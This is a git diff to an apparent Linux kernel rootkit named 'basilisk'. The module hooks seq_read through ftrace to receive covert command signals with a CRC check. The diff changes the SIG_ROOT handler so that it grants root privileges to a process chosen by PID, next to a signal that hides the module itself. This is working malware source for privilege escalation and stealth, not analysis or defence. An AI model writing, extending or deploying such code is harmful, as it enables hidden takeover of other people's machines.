@@ -12,9 +12,8 @@
 #include <linux/fs.h>
 #include <linux/namei.h>
 #include <linux/rwlock.h>
-
+#include <linux/pid.h>
 #include "include/crc32.h"
-
 #include "include/ftrace_helper.h"
 #include "include/stealth_helper.h"
 #include "include/utils.h"
@@ -51,7 +50,7 @@ static struct file_operations *king_fops = NULL;
 static DEFINE_RWLOCK(king_fops_lock);
 
 /* Executes appropriate functions based on given signal. Returns false (1) on wrong signal */
-bool sig_handle(const CmdSignal sig) {
+void sig_handle(const CmdSignal sig, pid_t pid) {
     switch (sig) {
         case SIG_HIDE:
             handle_lkm_hide(&hidden);
@@ -67,13 +66,12 @@ bool sig_handle(const CmdSignal sig) {
             break;
 
         case SIG_ROOT:
-            set_root();
+            set_root(pid);
             break;
 
         default:
-            return false;
+            break;
     }
-    return true;
 }
 
 /*
@@ -92,7 +90,10 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
     CmdSignal sig;
     uint32_t extracted_crc, calculated_crc;
     size_t crc_size = sizeof(uint32_t); // length of uint32_t
-    size_t data_size = 9;
+    size_t pid_size = sizeof(pid_t);
+
+    size_t data_size = 5 * sizeof(char) + sizeof(pid_t) + sizeof(uint32_t);
+    pid_t pid;
 
     kbuf = kmalloc(size, GFP_KERNEL);
     if (!kbuf) {
@@ -110,6 +111,7 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
     }
 
     sig = (CmdSignal)kbuf[0]; // first byte (command)
+    pid = *(pid_t *)(kbuf + data_size - (crc_size + sizeof(pid_t)));
     extracted_crc = *(uint32_t *)(kbuf + data_size - crc_size);
     calculated_crc = crc32(kbuf, data_size - crc_size);
 
@@ -118,7 +120,7 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
       return orig_seq_read(file, buf, size, ppos);
     }
     pr_info("basilisk: received signal: %x\n", sig);
-    sig_handle(sig);
+    sig_handle(sig, pid);
 
     kfree(kbuf);
     return orig_seq_read(file, buf, size, ppos);
